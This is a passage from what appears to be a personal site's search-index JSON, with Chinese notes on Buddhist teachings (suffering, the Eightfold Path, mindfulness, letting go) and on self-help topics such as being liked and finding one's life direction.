\uff1a\u89c2\u5bdf\u548c\u601d\u7ef4\u4e00\u5207\u6cd5\uff08\u5305\u62ec\u7269\u8d28\u548c\u7cbe\u795e\u73b0\u8c61\uff09\u90fd\u662f\u65e0\u6211\u7684\uff0c\u65e2\u6ca1\u6709\u6052\u5e38\u4e0d\u53d8\u7684\u81ea\u6211\uff0c\u4e5f\u6ca1\u6709\u72ec\u7acb\u81ea\u4e3b\u7684\u5b9e\u4f53\u3002\u901a\u8fc7\u8fd9\u79cd\u89c2\u5bdf\uff0c\u7834\u9664\u5bf9\u81ea\u6211\u548c\u5916\u754c\u73b0\u8c61\u7684\u6267\u7740\u3002 \u901a\u8fc7\u4fee\u4e60\u56db\u5ff5\u5904\uff0c\u4fee\u884c\u8005\u53ef\u4ee5\u9010\u6b65\u57f9\u517b\u5bf9\u8eab\u3001\u53d7\u3001\u5fc3\u3001\u6cd5\u7684\u6df1\u523b\u89c9\u77e5\uff0c\u51cf\u5c11\u70e6\u607c\u548c\u6267\u7740\uff0c\u6700\u7ec8\u8fbe\u5230\u5185\u5fc3\u7684\u5b81\u9759\u548c\u667a\u6167\u7684\u589e\u957f\u3002 \u7985\u4fee \u7985\u4fee \uff1a\u901a\u8fc7\u9759\u5750\u51a5\u60f3\u57f9\u517b\u5b9a\u529b\u548c\u667a\u6167\uff0c\u8fbe\u5230\u5185\u5fc3\u7684\u5b81\u9759\u548c\u89c9\u609f\u3002 \u6301\u6212 \u6301\u6212 \uff1a\u9075\u5b88\u9053\u5fb7\u6212\u5f8b\uff0c\u5982\u4e0d\u6740\u751f\u3001\u4e0d\u5077\u76d7\u3001\u4e0d\u90aa\u6deb\u7b49\uff0c\u51c0\u5316\u884c\u4e3a\u548c\u5fc3\u7075\u3002 \u6148\u60b2\u5fc3 \u6148\u60b2\u5fc3 \uff1a\u57f9\u517b\u6148\u60b2\u5fc3\uff0c\u5173\u7231\u4ed6\u4eba\uff0c\u51cf\u5c11\u81ea\u6211\u4e2d\u5fc3\uff0c\u589e\u52a0\u5185\u5fc3\u7684\u5e73\u548c\u4e0e\u559c\u60a6\u3002 \u653e\u4e0b \u653e\u4e0b\u6267\u7740 \uff1a\u6267\u7740\u4e8e\u7269\u8d28\u3001\u5173\u7cfb\u3001\u6210\u5c31\u7b49\u4f1a\u5bfc\u81f4\u75db\u82e6\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u4e1c\u897f\u90fd\u662f\u65e0\u5e38\u7684\u3001\u53d8\u5316\u7684\u3002\u901a\u8fc7\u653e\u4e0b\u5bf9\u8fd9\u4e9b\u4e8b\u7269\u7684\u6267\u7740\uff0c\u4eba\u4eec\u53ef\u4ee5\u51cf\u5c11\u5931\u843d\u611f\u548c\u4e0d\u6ee1\u8db3\u611f\u3002 \u653e\u4e0b\u6b32\u671b \uff1a\u6b32\u671b\u5e38\u5e38\u662f\u75db\u82e6\u7684\u6839\u6e90\uff0c\u56e0\u4e3a\u6b32\u671b\u5f97\u4e0d\u5230\u6ee1\u8db3\u65f6\u4f1a\u611f\u5230\u75db\u82e6\uff0c\u5373\u4f7f\u5f97\u5230\u4e86\u6ee1\u8db3\uff0c\u4e5f\u4f1a\u56e0\u4e3a\u5bb3\u6015\u5931\u53bb\u800c\u75db\u82e6\u3002\u653e\u4e0b\u6b32\u671b\uff0c\u57f9\u517b\u77e5\u8db3\u548c\u6ee1\u8db3\uff0c\u53ef\u4ee5\u51cf\u5c11\u75db\u82e6\u3002 \u653e\u4e0b\u81ea\u6211 \uff1a\u81ea\u6211\u4e2d\u5fc3\u7684\u601d\u7ef4\u65b9\u5f0f\u4f1a\u5e26\u6765\u5f88\u591a\u75db\u82e6\uff0c\u5305\u62ec\u81ea\u5c0a\u5fc3\u53d7\u635f\u3001\u5ac9\u5992\u3001\u6124\u6012\u7b49\u3002\u901a\u8fc7\u653e\u4e0b\u5bf9\u81ea\u6211\u7684\u6267\u7740\uff0c\u57f9\u517b\u65e0\u6211\u548c\u5229\u4ed6\u7684\u5fc3\u6001\uff0c\u53ef\u4ee5\u83b7\u5f97\u5185\u5fc3\u7684\u5e73\u9759\u548c\u89e3\u8131\u3002 \u653e\u4e0b\u8fc7\u53bb\u548c\u672a\u6765 \uff1a\u6267\u7740\u4e8e\u8fc7\u53bb\u7684\u4f24\u75db\u6216\u5bf9\u672a\u6765\u7684\u62c5\u5fe7\u90fd\u4f1a\u5e26\u6765\u75db\u82e6\u3002\u5b66\u4f1a\u6d3b\u5728\u5f53\u4e0b\uff0c\u653e\u4e0b\u5bf9\u8fc7\u53bb\u548c\u672a\u6765\u7684\u6267\u7740\uff0c\u53ef\u4ee5\u51cf\u8f7b\u7cbe\u795e\u4e0a\u7684\u8d1f\u62c5\u3002 \u653e\u4e0b\u5bf9\u63a7\u5236\u7684\u6e34\u671b \uff1a\u5f88\u591a\u75db\u82e6\u6765\u6e90\u4e8e\u6211\u4eec\u5bf9\u4e0d\u53ef\u63a7\u5236\u4e8b\u7269\u7684\u6267\u7740\u3002\u653e\u4e0b\u5bf9\u63a7\u5236\u7684\u6e34\u671b\uff0c\u63a5\u53d7\u73b0\u5b9e\u7684\u65e0\u5e38\u548c\u4e0d\u53ef\u9884\u6d4b\uff0c\u53ef\u4ee5\u5e26\u6765\u5185\u5fc3\u7684\u81ea\u7531\u3002","title":"\u4f5b\u6cd5\u4e2d\u89e3\u8131\u7684\u65b9\u6cd5"},{"location":"soft/%E4%BD%9B%E6%B3%95/#_1","text":"\u201c\u4f17\u751f\u7686\u82e6\u201d\u662f\u4f5b\u6559\u4e2d\u7684\u4e00\u4e2a\u91cd\u8981\u6559\u4e49\uff0c\u6307\u7684\u662f\u6240\u6709\u6709\u60c5\u4f17\u751f\uff08\u5373\u6240\u6709\u5177\u6709\u610f\u8bc6\u7684\u751f\u547d\u4f53\uff09\u90fd\u5728\u7ecf\u5386\u82e6\u96be\u3002\u8fd9\u4e2a\u6559\u4e49\u6e90\u4e8e\u4f5b\u9640\u7684\u201c\u56db\u8c1b\u201d\u6559\u4e49\uff0c\u7279\u522b\u662f\u201c\u82e6\u8c1b\u201d\uff0c\u5176\u4e2d\u660e\u786e\u6307\u51fa\u4e86\u751f\u547d\u4e2d\u5b58\u5728\u7684\u5404\u79cd\u82e6\u96be\u3002\u4ee5\u4e0b\u662f\u5bf9\u201c\u4f17\u751f\u7686\u82e6\u201d\u7684\u8be6\u7ec6\u89e3\u91ca\uff1a \u751f\u82e6 \uff1a\u51fa\u751f\u7684\u75db\u82e6\uff0c\u5305\u62ec\u4ece\u6bcd\u80ce\u4e2d\u5206\u5a29\u7684\u75db\u82e6\u3002 \u8001\u82e6 \uff1a\u8870\u8001\u7684\u75db\u82e6\uff0c\u8eab\u4f53\u548c\u7cbe\u795e\u7684\u8870\u9000\u3002 \u75c5\u82e6 \uff1a\u75be\u75c5\u5e26\u6765\u7684\u75db\u82e6\uff0c\u65e0\u8bba\u662f\u8eab\u4f53\u4e0a\u7684\u8fd8\u662f\u5fc3\u7406\u4e0a\u7684\u3002 \u6b7b\u82e6 \uff1a\u6b7b\u4ea1\u7684\u75db\u82e6\u548c\u4e34\u7ec8\u7684\u6050\u60e7\u3002 \u7231\u522b\u79bb\u82e6 \uff1a\u4e0e\u81ea\u5df1\u7231\u7684\u4eba\u6216\u4e8b\u7269\u5206\u79bb\u7684\u75db\u82e6\u3002 \u6028\u618e\u4f1a\u82e6 \uff1a\u4e0e\u81ea\u5df1\u618e\u6068\u7684\u4eba\u6216\u4e8b\u7269\u76f8\u9047\u7684\u75db\u82e6\u3002 \u6c42\u4e0d\u5f97\u82e6 \uff1a\u6e34\u671b\u7684\u4e8b\u7269\u6216\u76ee\u6807\u65e0\u6cd5\u8fbe\u6210\u7684\u75db\u82e6\u3002 \u4e94\u8574\u70bd\u76db\u82e6 \uff1a\u7531\u8272\u3001\u53d7\u3001\u60f3\u3001\u884c\u3001\u8bc6\u4e94\u8574\uff08\u6784\u6210\u4e2a\u4eba\u7ecf\u9a8c\u7684\u4e94\u4e2a\u8981\u7d20\uff09\u5e26\u6765\u7684\u79cd\u79cd\u70e6\u607c\u548c\u75db\u82e6\u3002 \u4f5b\u6559\u8ba4\u4e3a\uff0c\u8fd9\u4e9b\u82e6\u96be\u662f\u7531\u4e8e\u4eba\u4eec\u7684\u65e0\u660e\uff08\u5373\u5bf9\u771f\u7406\u7684\u65e0\u77e5\uff09\u3001\u8d2a\u6b32\u548c\u6267\u7740\u6240\u5bfc\u81f4\u7684\u3002\u901a\u8fc7\u4fee\u884c\u3001\u89c9\u609f\uff0c\u7279\u522b\u662f\u901a\u8fc7\u201c\u516b\u6b63\u9053\u201d\u7684\u5b9e\u8df5\uff0c\u4eba\u4eec\u53ef\u4ee5\u9010\u6e10\u6446\u8131\u8fd9\u4e9b\u82e6\u96be\uff0c\u8fbe\u5230\u6d85\u69c3\u7684\u89e3\u8131\u72b6\u6001\u3002","title":"\u4f17\u751f\u7686\u82e6"},{"location":"soft/%E4%BD%9B%E6%B3%95/#_2","text":"\u516b\u6b63\u9053\u662f\u4f5b\u6559\u4e2d\u7684\u4fee\u884c\u65b9\u6cd5\u548c\u751f\u6d3b\u6307\u5357\uff0c\u65e8\u5728\u5e2e\u52a9\u4fee\u884c\u8005\u8fbe\u5230\u89e3\u8131\u548c\u6d85\u69c3\u7684\u5883\u754c\u3002\u4ee5\u4e0b\u662f\u516b\u6b63\u9053\u7684\u7b80\u8981\u89e3\u91ca\uff1a \u6b63\u89c1 \uff1a\u6b63\u786e\u7684\u89c1\u89e3\u548c\u7406\u89e3\uff0c\u7279\u522b\u662f\u5bf9\u56db\u8c1b\uff08\u82e6\u3001\u96c6\u3001\u706d\u3001\u9053\uff09\u7684\u7406\u89e3\u3002 \u6b63\u601d\u7ef4 \uff1a\u6b63\u786e\u7684\u601d\u60f3\u548c\u610f\u56fe\uff0c\u5305\u62ec\u79bb\u6b32\u3001\u5584\u826f\u548c\u65e0\u5bb3\u7684\u601d\u60f3\u3002 \u6b63\u8bed \uff1a\u6b63\u786e\u7684\u8a00\u8bed\uff0c\u4e0d\u5984\u8bed\u3001\u4e0d\u6076\u53e3\u3001\u4e0d\u4e24\u820c\u3001\u4e0d\u7eee\u8bed\uff0c\u4fdd\u6301\u8bda\u5b9e\u548c\u5584\u610f\u3002 \u6b63\u4e1a \uff1a\u6b63\u786e\u7684\u884c\u4e3a\uff0c\u4e0d\u6740\u751f\u3001\u4e0d\u5077\u76d7\u3001\u4e0d\u90aa\u6deb\uff0c\u884c\u4e3a\u7b26\u5408\u9053\u5fb7\u89c4\u8303\u3002 \u6b63\u547d \uff1a\u6b63\u5f53\u7684\u8c0b\u751f\u624b\u6bb5\uff0c\u9009\u62e9\u4e0d\u4f24\u5bb3\u4ed6\u4eba\u7684\u804c\u4e1a\uff0c\u4fdd\u6301\u751f\u6d3b\u7684\u6b63\u5f53\u6027\u3002 \u6b63\u7cbe\u8fdb \uff1a\u6b63\u786e\u7684\u52aa\u529b\uff0c\u52e4\u594b\u4fee\u884c\uff0c\u907f\u514d\u4e0d\u5584\u7684\u72b6\u6001\uff0c\u589e\u957f\u5584\u6cd5\u3002 \u6b63\u5ff5 \uff1a\u6b63\u786e\u7684\u89c9\u77e5\u548c\u4e13\u6ce8\uff0c\u7279\u522b\u662f\u5bf9\u8eab\u3001\u53d7\u3001\u5fc3\u3001\u6cd5\u7684\u56db\u5ff5\u5904\u7684\u89c2\u7167\u3002 \u6b63\u5b9a \uff1a\u6b63\u786e\u7684\u7985\u5b9a\uff0c\u901a\u8fc7\u6df1\u5ea6\u7684\u51a5\u60f3\u548c\u96c6\u4e2d\uff0c\u57f9\u517b\u5185\u5fc3\u7684\u5e73\u9759\u548c\u89c9\u609f\u3002 \u516b\u6b63\u9053\u7efc\u5408\u4e86\u667a\u6167\u3001\u9053\u5fb7\u548c\u7985\u4fee\u4e09\u4e2a\u65b9\u9762\uff0c\u662f\u4e00\u6761\u5168\u9762\u7684\u4fee\u884c\u4e4b\u8def\uff0c\u5e2e\u52a9\u4fee\u884c\u8005\u51cf\u5c11\u75db\u82e6\uff0c\u6700\u7ec8\u8fbe\u5230\u89e3\u8131\u3002","title":"\u516b\u6b63\u9053"},{"location":"soft/%E4%BD%9B%E6%B3%95/#_3","text":"\u56db\u5ff5\u5904\u662f\u4f5b\u6559\u4e2d\u7684\u4e00\u79cd\u4fee\u884c\u65b9\u6cd5\uff0c\u65e8\u5728\u901a\u8fc7\u6df1\u5165\u89c2\u5bdf\u548c\u89c9\u77e5\u6765\u57f9\u517b\u667a\u6167\u548c\u89c9\u609f\u3002\u4ee5\u4e0b\u662f\u56db\u5ff5\u5904\u7684\u7b80\u8981\u89e3\u91ca\uff1a \u89c2\u8eab\u4e0d\u51c0 \uff1a\u89c2\u5bdf\u548c\u601d\u7ef4\u8eab\u4f53\u7684\u5404\u79cd\u4e0d\u51c0\u4e4b\u5904\uff0c\u8ba4\u8bc6\u5230\u8eab\u4f53\u5e76\u975e\u6052\u5e38\u7f8e\u4e3d\uff0c\u8fdb\u800c\u51cf\u5c11\u5bf9\u8eab\u4f53\u7684\u6267\u7740\u3002\u5177\u4f53\u65b9\u6cd5\u5305\u62ec\u89c2\u5bdf\u547c\u5438\u3001\u8eab\u4f53\u59ff\u52bf\u3001\u8eab\u4f53\u7684\u4e0d\u51c0\u90e8\u5206\u7b49\u3002 \u89c2\u53d7\u662f\u82e6 \uff1a\u89c2\u5bdf\u548c\u8ba4\u8bc6\u5404\u79cd\u611f\u53d7\uff08\u5305\u62ec\u75db\u82e6\u3001\u5feb\u4e50\u548c\u4e2d\u6027\u7684\u611f\u53d7\uff09\u672c\u8d28\u4e0a\u90fd\u662f\u82e6\u7684\uff0c\u56e0\u4e3a\u5b83\u4eec\u90fd\u662f\u65e0\u5e38\u548c\u53d8\u5316\u7684\u3002\u901a\u8fc7\u8fd9\u79cd\u89c2\u5bdf\uff0c\u51cf\u5c11\u5bf9\u611f\u53d7\u7684\u6267\u7740\u3002 \u89c2\u5fc3\u65e0\u5e38 \uff1a\u89c2\u5bdf\u548c\u8ba4\u8bc6\u5230\u5fc3\u7684\u5404\u79cd\u72b6\u6001\uff08\u5982\u8d2a\u3001\u55d4\u3001\u75f4\u3001\u5584\u5ff5\u3001\u6076\u5ff5\u7b49\uff09\u90fd\u662f\u65e0\u5e38\u548c\u53d8\u5316\u7684\u3002\u901a\u8fc7\u8fd9\u79cd\u89c2\u5bdf\uff0c\u57f9\u517b\u5bf9\u5fc3\u7684\u6e05\u6670\u89c9\u77e5\u548c\u4e0d\u6267\u7740\u3002 \u89c2\u6cd5\u65e0\u6211 \uff1a\u89c2\u5bdf\u548c\u601d\u7ef4\u4e00\u5207\u6cd5\uff08\u5305\u62ec\u7269\u8d28\u548c\u7cbe\u795e\u73b0\u8c61\uff09\u90fd\u662f\u65e0\u6211\u7684\uff0c\u65e2\u6ca1\u6709\u6052\u5e38\u4e0d\u53d8\u7684\u81ea\u6211\uff0c\u4e5f\u6ca1\u6709\u72ec\u7acb\u81ea\u4e3b\u7684\u5b9e\u4f53\u3002\u901a\u8fc7\u8fd9\u79cd\u89c2\u5bdf\uff0c\u7834\u9664\u5bf9\u81ea\u6211\u548c\u5916\u754c\u73b0\u8c61\u7684\u6267\u7740\u3002 \u901a\u8fc7\u4fee\u4e60\u56db\u5ff5\u5904\uff0c\u4fee\u884c\u8005\u53ef\u4ee5\u9010\u6b65\u57f9\u517b\u5bf9\u8eab\u3001\u53d7\u3001\u5fc3\u3001\u6cd5\u7684\u6df1\u523b\u89c9\u77e5\uff0c\u51cf\u5c11\u70e6\u607c\u548c\u6267\u7740\uff0c\u6700\u7ec8\u8fbe\u5230\u5185\u5fc3\u7684\u5b81\u9759\u548c\u667a\u6167\u7684\u589e\u957f\u3002","title":"\u56db\u5ff5\u5904"},{"location":"soft/%E4%BD%9B%E6%B3%95/#_4","text":"\u7985\u4fee \uff1a\u901a\u8fc7\u9759\u5750\u51a5\u60f3\u57f9\u517b\u5b9a\u529b\u548c\u667a\u6167\uff0c\u8fbe\u5230\u5185\u5fc3\u7684\u5b81\u9759\u548c\u89c9\u609f\u3002","title":"\u7985\u4fee"},{"location":"soft/%E4%BD%9B%E6%B3%95/#_5","text":"\u6301\u6212 \uff1a\u9075\u5b88\u9053\u5fb7\u6212\u5f8b\uff0c\u5982\u4e0d\u6740\u751f\u3001\u4e0d\u5077\u76d7\u3001\u4e0d\u90aa\u6deb\u7b49\uff0c\u51c0\u5316\u884c\u4e3a\u548c\u5fc3\u7075\u3002","title":"\u6301\u6212"},{"location":"soft/%E4%BD%9B%E6%B3%95/#_6","text":"\u6148\u60b2\u5fc3 \uff1a\u57f9\u517b\u6148\u60b2\u5fc3\uff0c\u5173\u7231\u4ed6\u4eba\uff0c\u51cf\u5c11\u81ea\u6211\u4e2d\u5fc3\uff0c\u589e\u52a0\u5185\u5fc3\u7684\u5e73\u548c\u4e0e\u559c\u60a6\u3002","title":"\u6148\u60b2\u5fc3"},{"location":"soft/%E4%BD%9B%E6%B3%95/#_7","text":"\u653e\u4e0b\u6267\u7740 \uff1a\u6267\u7740\u4e8e\u7269\u8d28\u3001\u5173\u7cfb\u3001\u6210\u5c31\u7b49\u4f1a\u5bfc\u81f4\u75db\u82e6\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u4e1c\u897f\u90fd\u662f\u65e0\u5e38\u7684\u3001\u53d8\u5316\u7684\u3002\u901a\u8fc7\u653e\u4e0b\u5bf9\u8fd9\u4e9b\u4e8b\u7269\u7684\u6267\u7740\uff0c\u4eba\u4eec\u53ef\u4ee5\u51cf\u5c11\u5931\u843d\u611f\u548c\u4e0d\u6ee1\u8db3\u611f\u3002 \u653e\u4e0b\u6b32\u671b \uff1a\u6b32\u671b\u5e38\u5e38\u662f\u75db\u82e6\u7684\u6839\u6e90\uff0c\u56e0\u4e3a\u6b32\u671b\u5f97\u4e0d\u5230\u6ee1\u8db3\u65f6\u4f1a\u611f\u5230\u75db\u82e6\uff0c\u5373\u4f7f\u5f97\u5230\u4e86\u6ee1\u8db3\uff0c\u4e5f\u4f1a\u56e0\u4e3a\u5bb3\u6015\u5931\u53bb\u800c\u75db\u82e6\u3002\u653e\u4e0b\u6b32\u671b\uff0c\u57f9\u517b\u77e5\u8db3\u548c\u6ee1\u8db3\uff0c\u53ef\u4ee5\u51cf\u5c11\u75db\u82e6\u3002 \u653e\u4e0b\u81ea\u6211 \uff1a\u81ea\u6211\u4e2d\u5fc3\u7684\u601d\u7ef4\u65b9\u5f0f\u4f1a\u5e26\u6765\u5f88\u591a\u75db\u82e6\uff0c\u5305\u62ec\u81ea\u5c0a\u5fc3\u53d7\u635f\u3001\u5ac9\u5992\u3001\u6124\u6012\u7b49\u3002\u901a\u8fc7\u653e\u4e0b\u5bf9\u81ea\u6211\u7684\u6267\u7740\uff0c\u57f9\u517b\u65e0\u6211\u548c\u5229\u4ed6\u7684\u5fc3\u6001\uff0c\u53ef\u4ee5\u83b7\u5f97\u5185\u5fc3\u7684\u5e73\u9759\u548c\u89e3\u8131\u3002 \u653e\u4e0b\u8fc7\u53bb\u548c\u672a\u6765 \uff1a\u6267\u7740\u4e8e\u8fc7\u53bb\u7684\u4f24\u75db\u6216\u5bf9\u672a\u6765\u7684\u62c5\u5fe7\u90fd\u4f1a\u5e26\u6765\u75db\u82e6\u3002\u5b66\u4f1a\u6d3b\u5728\u5f53\u4e0b\uff0c\u653e\u4e0b\u5bf9\u8fc7\u53bb\u548c\u672a\u6765\u7684\u6267\u7740\uff0c\u53ef\u4ee5\u51cf\u8f7b\u7cbe\u795e\u4e0a\u7684\u8d1f\u62c5\u3002 \u653e\u4e0b\u5bf9\u63a7\u5236\u7684\u6e34\u671b \uff1a\u5f88\u591a\u75db\u82e6\u6765\u6e90\u4e8e\u6211\u4eec\u5bf9\u4e0d\u53ef\u63a7\u5236\u4e8b\u7269\u7684\u6267\u7740\u3002\u653e\u4e0b\u5bf9\u63a7\u5236\u7684\u6e34\u671b\uff0c\u63a5\u53d7\u73b0\u5b9e\u7684\u65e0\u5e38\u548c\u4e0d\u53ef\u9884\u6d4b\uff0c\u53ef\u4ee5\u5e26\u6765\u5185\u5fc3\u7684\u81ea\u7531\u3002","title":"\u653e\u4e0b"},{"location":"soft/%E5%8F%AF%E4%BB%A5%E8%A2%AB%E5%88%AB%E4%BA%BA%E5%96%9C%E6%AC%A2/","text":"\u5173\u6ce8\u522b\u4eba\uff0c\u5e76\u4e14\u5efa\u7acb\u5bf9\u522b\u4eba\u7684\u5174\u8da3 \u5fae\u7b11 \u8bb0\u4f4f\u522b\u4eba\u7684\u540d\u5b57 \u503e\u542c \u8c08\u8bba\u5bf9\u65b9\u6240\u611f\u5174\u8da3\u7684 \u8ba9\u5bf9\u65b9\u77e5\u9053\u4ed6\u5f88\u91cd\u8981","title":"\u53ef\u4ee5\u88ab\u522b\u4eba\u559c\u6b22"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/","text":"\u5982\u4f55\u5bfb\u627e\u4eba\u751f\u4e4b\u8def \u4e66\u7c4d\uff1a \u300a\u5982\u4f55\u627e\u5230\u60f3\u505a\u7684\u4e8b\u300b \u5bfb\u627e\u4eba\u751f\u4e4b\u8def\uff0c\u8981\u8bbe\u7acb\u6761\u4ef6\u548c\u6807\u51c6\uff0c\u5927\u90e8\u5206\u4eba\u662f\u4e0d\u4e86\u89e3\u81ea\u5df1\uff0c\u53ef\u80fd\u522b\u4eba\u7684\u770b\u6cd5\u624d\u662f\u5bf9\u7684\uff0c\u613f\u671b\u5927\u90e8\u5206\u4e0d\u662f\u4eba\u751f\u4e4b\u8def \u4e94\u4e2a\u8bef\u533a\uff1a \u505a\u4e00\u4e2a\u9009\u62e9\uff0c\u8fd9\u4e2a\u9009\u62e9\u505a\u4e00\u8f88\u5b50 \u627e\u5230\u4eba\u751f\u4e4b\u8def\uff0c\u6ca1\u6709\u4e00\u89c1\u949f\u60c5\u7684\u611f\u89c9 \u4eba\u751f\u7684\u9009\u62e9\u4e0d\u4e00\u5b9a\u5bf9\u793e\u4f1a\u6709\u4ef7\u503c \u6709\u4eba\u89c9\u5f97\u6ca1\u6709\u9009\u62e9 \u4eba\u751f\u4e4b\u8def\u4e0d\u4e00\u5b9a\u80fd\u8d5a\u94b1 \u4ef7\u503c\u89c2 \u4ece\u4ee5\u4e94\u4e2a\u95ee\u9898\u4e2d\u603b\u7ed3\u51fa\u6838\u5fc3\u3001\u91cd\u590d\u7684\u4e1c\u897f\uff1a \u4f60\u6709\u5c0a\u656c\u7684\u4eba\u561b\uff1f\u6216\u8005\u5d07\u62dc\u7684\u4eba\uff1f\u4f60\u4e3a\u4ec0\u4e48\u5c0a\u656c\u4ed6\uff1f\u4f60\u4e3a\u4ec0\u4e48\u5d07\u62dc\u4ed6\uff1f\u559c\u6b22\u4ed6\u4ec0\u4e48\u5730\u65b9\uff1f \u4f60\u5728\u9752\u6625\u671f\u6216\u8005\u4eba\u751f\u6700\u6d3b\u8dc3\u7684\u65f6\u671f\uff0c\u662f\u5426\u6709\u5bf9\u4f60\u5f71\u54cd\u5f88\u5927\u7684\u4e8b\u60c5\uff1f\u90a3\u4ef6\u4e8b\u60c5\u5f71\u54cd\u4e86\u4f60\u7684\u4eba\u751f\u8f68\u8ff9\u6216\u8005\u5bf9\u4f60\u7684\u4eba\u751f\u89c2\u3001\u4ef7\u503c\u89c2\u6709\u51b2\u51fb\u7684\u5730\u65b9 \u73b0\u5728\u7684\u793e\u4f1a\u6709\u4ec0\u4e48\u4e0d\u8db3\u7684\u5730\u65b9\uff1f \u5728\u670b\u53cb\u773c\u91cc\uff0c\u4f60\u662f\u4e00\u4e2a\u770b\u4e2d\u4ec0\u4e48\u4e1c\u897f\u7684\u4eba\uff1f \u4f1a\u7ed9\u522b\u4eba\u7684\u5efa\u8bae\u662f\u4ec0\u4e48\uff1f\u4e0d\u5e0c\u671b\u670b\u53cb\u7ed9\u6211\u4ec0\u4e48\u5efa\u8bae\uff1f \u5929\u8d4b---\u4f60\u7684\u8bf4\u660e\u4e66 \u200b \u4e24\u4e2a\u8bef\u533a\uff1a \u559c\u6b22\u4e0d\u662f\u5929\u8d4b \u6280\u672f\u548c\u64c5\u957f\u4e0d\u662f\u5929\u8d4b\uff0c\u4f8b\u5982\u957f\u5f97\u597d\u770b\u3001\u4e50\u611f\u3001\u8eab\u6750\u6bd4\u4f8b\u3001\u8bb0\u5fc6\u529b\uff0c\u4ece\u6765\u4e0d\u62c9\u809a\u5b50\u3001\u5343\u676f\u4e0d\u5012\u8fd9\u90fd\u662f\u5929\u8d4b\uff0c\u7f3a\u70b9\u53e6\u4e00\u4e2a\u89d2\u5ea6\u770b\u4e5f\u662f\u957f\u5904 \u200b \u4ece\u4ee5\u4e94\u4e2a\u95ee\u9898\u4e2d\u603b\u7ed3\u51fa\u6838\u5fc3\u3001\u91cd\u590d\u7684\u4e1c\u897f\uff1a \u76ee\u524d\u4eba\u751f\u6700\u5145\u5b9e\u7684\u7ecf\u5386\u662f\u4ec0\u4e48\uff1f\u7279\u522b\u6709\u5e72\u52b2\uff0c\u5145\u6ee1\u7cbe\u529b\uff0c\u975e\u5e38\u987a\u5229\u7684\u65f6\u671f \u6700\u8fd1\u4e00\u6b21\u8ba9\u4f60\u4e0d\u8010\u70e6\u7684\u4e8b\u60c5\u662f\u4ec0\u4e48\uff1f \u95ee\u8eab\u8fb9\u7684\u4eba\u81ea\u5df1\u64c5\u957f\u4ec0\u4e48\uff1f \u653e\u5f03\u73b0\u5728\u7684\u5de5\u4f5c\u7279\u522b\u60f3\u505a\u7684\u4e8b\u60c5\uff1f \u76ee\u524d\u4e3a\u6b62\u6210\u529f\u7684\u4e8b\u60c5\uff1f\u4f8b\u5982\u6210\u7ee9\u597d\uff0c\u8dd1\u7684\u5feb \u559c\u6b22\u7684\u4e8b\uff08\u68a6\u60f3\u613f\u671b\uff09 \u200b \u68a6\u60f3\u548c\u613f\u671b\u5e94\u8be5\u662f\u81ea\u5df1\u559c\u6b22\u6216\u8005\u611f\u5174\u8da3\u7684\uff0c\u800c\u4e0d\u662f\u6709\u610f\u4e49\u7684\uff0c\u6ca1\u6709\u610f\u4e49\u4e5f\u559c\u6b22\u624d\u662f\u68a6\u60f3 \u200b \u4ece\u4ee5\u4e94\u4e2a\u95ee\u9898\u4e2d\u603b\u7ed3\u51fa\u6838\u5fc3\u3001\u91cd\u590d\u7684\u4e1c\u897f\uff1a \u4ec0\u4e48\u4e8b\u60c5\u5c31\u7b97\u662f\u82b1\u94b1\u4e5f\u613f\u610f\u53bb\u5b66\uff1f \u4f60\u7684\u4e66\u67b6\u4e0a\u6709\u4ec0\u4e48\u4e66\uff0c\u5bf9\u4ec0\u4e48\u4e1c\u897f\u611f\u5174\u8da3\uff1f \u6709\u6ca1\u6709\u4ec0\u4e48\u5185\u5bb9\u5bf9\u4f60\u5f88\u5927\u5e2e\u52a9\uff1f \u4f60\u6709\u60f3\u8981\u611f\u8c22\u7684\u4eba\u6216\u8005\u4e8b\u60c5\uff1f \u4f60\u5bf9\u8fd9\u4e2a\u4e16\u754c\u6216\u8005\u793e\u4f1a\u6709\u4ec0\u4e48\u4e0d\u6ee1\u7684\u5730\u65b9\u5417\uff1f \u603b\u7ed3 \u68a6\u60f3\u548c\u624d\u80fd\u8054\u7cfb\u8d77\u6765\uff0c\u8fd9\u5c31\u662f\u53ef\u80fd\u7684\u4eba\u751f\u65b9\u5411 \u6700\u7ec8\u7684\u9009\u62e9\u4e00\u5b9a\u8981\u7b26\u5408\u4f60\u7684\u4ef7\u503c\u89c2 \u8fd9\u6b21\u9009\u62e9\u4e0d\u662f\u4f60\u7684\u6700\u540e\u4e00\u6b21\u9009\u62e9 30\u4e2a\u95ee\u9898\uff0c\u627e\u5230\u4ef7\u503c\u89c2 30\u4e2a\u95ee\u9898\uff0c\u627e\u5230\u5929\u8d4b 30\u4e2a\u95ee\u9898\uff0c\u627e\u5230\u559c\u6b22\u7684\u4e8b 100\u4e2a\u4ef7\u503c\u89c2\u6837\u4f8b 100\u4e2a\u5929\u8d4b\u6837\u4f8b 100\u4e2a\u559c\u6b22\u6837\u4f8b","title":"\u5bfb\u627e\u4eba\u751f\u4e4b\u8def"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#_1","text":"","title":"\u5982\u4f55\u5bfb\u627e\u4eba\u751f\u4e4b\u8def"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#_2","text":"\u300a\u5982\u4f55\u627e\u5230\u60f3\u505a\u7684\u4e8b\u300b \u5bfb\u627e\u4eba\u751f\u4e4b\u8def\uff0c\u8981\u8bbe\u7acb\u6761\u4ef6\u548c\u6807\u51c6\uff0c\u5927\u90e8\u5206\u4eba\u662f\u4e0d\u4e86\u89e3\u81ea\u5df1\uff0c\u53ef\u80fd\u522b\u4eba\u7684\u770b\u6cd5\u624d\u662f\u5bf9\u7684\uff0c\u613f\u671b\u5927\u90e8\u5206\u4e0d\u662f\u4eba\u751f\u4e4b\u8def","title":"\u4e66\u7c4d\uff1a"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#_3","text":"\u505a\u4e00\u4e2a\u9009\u62e9\uff0c\u8fd9\u4e2a\u9009\u62e9\u505a\u4e00\u8f88\u5b50 \u627e\u5230\u4eba\u751f\u4e4b\u8def\uff0c\u6ca1\u6709\u4e00\u89c1\u949f\u60c5\u7684\u611f\u89c9 